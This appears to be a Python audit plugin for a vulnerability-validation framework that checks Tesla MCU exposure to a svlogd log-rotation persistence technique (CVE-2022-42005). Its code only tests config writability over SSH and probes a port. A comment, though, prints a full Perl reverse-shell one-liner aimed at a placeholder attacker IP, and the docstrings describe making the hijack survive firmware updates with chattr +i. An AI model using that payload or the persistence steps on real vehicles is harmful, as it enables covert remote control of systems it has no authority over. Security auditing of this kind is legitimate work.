#!/usr/bin/env python3
"""CVE-2022-42005 – Tesla svlogd persistent log-shell via log-rotation processor hijack.

Public PoC source: https://github.com/AnalyticETH/tesla-security-research
Technique (04-LOG-BACKSHELL-AND-DV-ACCESS.md):
  svlogd reads a per-service config file in /var/log/<service>/config.
  The "!" directive executes a command each time a log file is rotated.
  An attacker who already has root replaces the gzip command with a reverse-shell
  script, then marks the config immutable (chattr +i) so it survives firmware
  updates.  The backshell reconnects to the attacker each time log rotation fires.

Safety gate: is_disruptive=True; requires allow_disruptive=true + operator approval.
  In lab mode this plugin ONLY validates that the svlogd config processor
  directive is writable/executable and whether prototype_server is reachable,
  without installing any persistent script.
"""
from __future__ import annotations

import json
import os
import subprocess
import tempfile
import time

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 2,
    "cve": "CVE-2022-42005",
    "year": 2022,
    "domain": "network",
    "vendor_product": "Tesla Model 3/Y infotainment MCU",
    "component": "svlogd log-rotation config / prototype_server",
    "type": "Persistence / log shell",
    "summary": (
        "After obtaining root, an attacker replaces the svlogd compression command "
        "in /var/log/<service>/config with a custom shell script that opens a reverse "
        "shell.  The config is then marked immutable (chattr +i) so it survives "
        "firmware updates, providing persistent code execution under the 'log' account."
    ),
    "source_url": "https://github.com/AnalyticETH/tesla-security-research",
    "requires_manual_review": True,
    "affected": [{"vendor": "Tesla", "product": "Tesla Model 3/Y MCU", "versions": [{"version": "<2021.32.10", "status": "affected"}]}],
    # PoC trigger: write "! /path/to/gzip.sh" into a svlogd config and trigger rotation
    # Full reverse-shell payload from AnalyticETH repo:
    #   perl -e 'use Socket;$i="<ATTACKER_IP>";$p=1719;
    #     socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    #     if(connect(S,sockaddr_in($p,inet_aton($i)))){
    #       open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}; '
    # Adapted: plugin checks config writability + prototype_server exposure ONLY.
}


# --- Original exploit logic (adapted, non-weaponised) ---

SVLOGD_SERVICE_DIR = "/var/log/wpa_supplicant"
PROTOTYPE_SERVER_CONF_PATH = "/home/tesla/.Tesla/data/settings.conf"
PROTOTYPE_SERVER_WS_PORT = 8082


def _check_svlogd_config_writable(target_host: str) -> dict:
    """Check whether the svlogd config file can be written (via SSH if available).

    In full-lab mode with allow_disruptive the original PoC would write:
        !sh /var/log/wpa_supplicant/gzip.sh -c
    and mark it immutable.  Here we only test writability.
    """
    result = {"writable": False, "immutable": False, "detail": ""}
    try:
        proc = subprocess.run(
            ["ssh", "-o", "ConnectTimeout=5", "-o", "BatchMode=yes",
             f"root@{target_host}",
             f"ls -la {SVLOGD_SERVICE_DIR}/config && lsattr {SVLOGD_SERVICE_DIR}/config"],
            capture_output=True, text=True, timeout=10,
        )
        out = proc.stdout + proc.stderr
        result["detail"] = out[:400]
        result["writable"] = proc.returncode == 0
        result["immutable"] = "i---" in out or "----i" in out
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _check_prototype_server(target_host: str) -> dict:
    """Probe whether prototype_server websocket port 8082 is open on the target."""
    import socket as _s
    result = {"exposed": False, "detail": ""}
    try:
        with _s.create_connection((target_host, PROTOTYPE_SERVER_WS_PORT), timeout=4):
            result["exposed"] = True
            result["detail"] = f"prototype_server port {PROTOTYPE_SERVER_WS_PORT} is reachable – data-value access may be available."
    except _s.timeout:
        result["detail"] = "prototype_server port not reachable (timeout)."
    except ConnectionRefusedError:
        result["detail"] = "prototype_server port not open (refused)."
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _run_poc(plugin):
    target = (plugin.params or {}).get("target_ip", "192.168.90.100")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    svlogd = _check_svlogd_config_writable(target)
    proto  = _check_prototype_server(target)

    evidence = {
        "cve": "CVE-2022-42005",
        "target": target,
        "svlogd_config_writable": svlogd["writable"],
        "svlogd_config_immutable": svlogd["immutable"],
        "prototype_server_exposed": proto["exposed"],
        "svlogd_detail": svlogd["detail"],
        "prototype_detail": proto["detail"],
    }

    # Determine vulnerability based on observation
    vulnerable = svlogd["writable"] or proto["exposed"]
    if allow_disruptive and svlogd["writable"]:
        evidence["would_install_payload"] = (
            "BLOCKED – payload would write !sh reverse-shell directive into "
            f"{SVLOGD_SERVICE_DIR}/config and call 'chattr +i' to make it "
            "persistent.  Run manually in authorised bench only."
        )

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "AnalyticETH/tesla-security-research / 04-LOG-BACKSHELL-AND-DV-ACCESS.md",
    }


class Poc68CVE202242005PersistenceLogShellAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-NET-068"
    meta_poc_name   = "CVE-2022-42005 Tesla svlogd Persistence / Log Shell"
    meta_cve_id     = "CVE-2022-42005"
    meta_severity   = "High"
    meta_protocol   = "local"
    meta_target_os  = ["linux"]
    meta_required_params = ["target_ip"]
    meta_profiles   = ["network", "local_artifact"]
    meta_source_url = "https://github.com/AnalyticETH/tesla-security-research"
    meta_attack_surface = "Tesla MCU root-access persistence via svlogd processor directive"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_ip"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
